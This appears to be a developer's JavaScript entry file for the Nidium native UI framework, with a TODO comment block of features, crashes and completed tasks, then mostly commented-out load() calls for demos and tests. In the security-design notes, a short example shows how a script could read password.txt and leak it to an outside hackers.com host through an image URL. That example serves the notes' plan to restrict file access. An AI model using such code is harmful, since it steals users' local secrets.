/*
	Today :

		- NML basics + include
		- donner texture du dessous au shader;
		- canvas.blur(0, 1 ... 4);


	CANVAS :
		- canvas.toArrayBuffer();
		- window.canvas.snapshot(x, y, w, h);
		- import des fontes


	SECURITY DESIGN :
		- restraindre API File dans le dossier definie par localFileAccess

		- les appels à File.read("config.bin") --> dist/shared/config.bin

		- Nidium Malicious Bacon Attack :
			var m = File.read("password.txt", function(data, size){
				var i = new Image();
				t.src = "http://www.hackers.com/content="+URLencode(data);
			});

	FINITIONS
		- Callback d'érreur si le fichier ne peux pas être ouvert (404 http, fichier local inexistant, etc..)


	IMPACT SIGNIFICATIF :
		- Gestion du cache

	CRASH :
		- bug des gradients (crash)
		- showFPS(true) crash au refresh

	THREADS AND WORKER
		- thread crash
		- Synchronous File API in Thread
		- API Worker + rajouter include (voir ça https://github.com/astro/bitford/blob/master/src/sha1-worker.js)

	STEALTH INVISIBLE MODE :
		- 512Mo Ramdisk
		- Cleanup Destruction on quit

	COMPLEXE : 
		- scale

	VERY LOW PRIORITY : 
		- ctx.outlineBlur = 5;
		- ctx.outlineColor = "blue";
		- nss can not be empty and must have minimum {} in it
		- subtlepatterns.com : contacter (DONE) et rajouter le crédit
		- window.resize

------
DONE :
------

	DAY 5:
	- window.storage.set (sync)
	- window.storage.get (sync)

	DAY 4:
	- shader ne suit pas le coin haut gauche du layer (DONE)
	- faire que attachFragmentShader tiennent compte du padding (DONE)
	- Work with Nico : crash au start sur linux (maybe font / skia)
	- Bug Gradient UIOption (DONE)
	- cabler window.devicePixelRatio (WIP)

	DAY 3:
	- Stream API: getFileSize (distant + locaux) (DONE)
	- Stream API: seek (distant + locaux) (DONE)
	- Stream API: Implémenter NativeStream::stop() (DONE)
	- cabler canvas.attachFragmentShader(); (DONE)
	- cabler canvas.detachFragmentShader(); (DONE)

	DAY 2
	- renommer Native.canvas en window.canvas (main canvas)
	- Stream API Design + WIP

	DAY 1
	- corriger textAlign vertical (center) (DONE)
	- renommer ctx.fontType en ctx.fontFamily (DONE)
	- window.requestAnimationFrame; (DONE)
	- measureText.width (DONE)
	- nml : <viewport>1024x768</viewport> (DONE)
	- nml est maintenant parsé avant le lancement (DONE)

	OLD
	- Image() et File() file relative to nml : (DONE)
	- document.location.href = "fdsf/view.nml"; (DONE)
	- contextmenu window.mouseX, window.mouseY (DONE)
	- radial gradient : fail (DONE)
	- button down rotation : fail (DONE)
	- textAlign vertical (ALMOST DONE)

*/

//document.background = "#000000";
//load("sample.js");

//load("applications/_tests/timers.js");
//load("applications/_tests/arc.js");
//load("applications/_tests/canvas.js");
//load("applications/_tests/sockets.client.js");
//load("applications/_tests/sockets.server.js");
//load("applications/_tests/tasks.js");

//load("applications/components/hello.js");
//load("applications/components/motion.js");
//load("applications/components/tabs.js");
//load("applications/components/profiler.js");
//load("applications/components/windows.js");
//load("applications/components/dropdown.js");
//load("applications/components/buttons.js");
//load("applications/components/sliders.js");
//load("applications/components/scrollbars.js");
//load("applications/components/modal.js");
//load("applications/components/threads.js"); // crash
//load("applications/components/tooltips.js");
//load("applications/components/animation.js");
//load("applications/components/flickr.js");
//load("applications/components/http.js");
//load("applications/components/zip.js");

//load("applications/components/text.js"); // FAIL
//load("applications/components/__zzz.js");

/* CANVAS TESTS */

//load("applications/canvas/water.js"); // fail
//load("applications/canvas/sand.js");
//load("applications/canvas/bluewheel.js"); // fail
//load("applications/canvas/cube.js"); // chute de perf VS premières versions 
//load("applications/canvas/cubewall.js"); // RAS
//load("applications/canvas/flamme.js"); // OK
//load("applications/canvas/particles.js"); // slow
//load("applications/canvas/text.js"); // OK
//load("applications/canvas/shader.js"); // OK

//load("applications/components/flickr.js");


/* UNIT TESTS */

	//load("applications/_tests/arc.js");
	//load("testArc.js");
	//load("testRetina.js");


/* MEDIA API */

	//load("applications/audio/test.js"); // CRASH au refresh + BRUIT DE BETE
	//load("applications/audio/mixer.js"); // FAIL TOTAL + BRUIT DE BETE
	//load("applications/audio/dsp.js"); // crash
	//load("applications/media/video.js"); // crash on refresh (and video end)

/* FILE API */

	//load("applications/components/file.basic.js");
	//load("applications/components/file.advanced.js");


/* SHADERS */

	load("applications/components/shader.js"); // OK
	//load("applications/components/shader.basic.js"); // TODO : relative path to app
	//load("applications/components/shader.advanced.js"); // TODO : relative path to app

/* TUTORIALS */

	//load("applications/tutorials/01.hello.js");
	//load("applications/tutorials/02.buttons.js");
	//load("applications/tutorials/03.events.js");
	//load("applications/tutorials/04.motion.js");
	//load("applications/tutorials/11.post.js");

/* CHARTS DEMOS */

	//load("applications/charts/line.js");
	//load("applications/charts/pie.js");
	//load("applications/charts/polar.js"); // implement vertical text align
	//load("applications/charts/donut.js");
	//load("applications/charts/radar.js");
	//load("applications/charts/bar.js");
	//load("applications/charts/demo.js");

/* Unfinished */

	//load("applications/components/splines.js"); // LENTEUR ABOMINABLE
	//load("applications/components/diagrams.js");



/* -- Native Debugger ------------------ */

//load("applications/NatBug.nap");

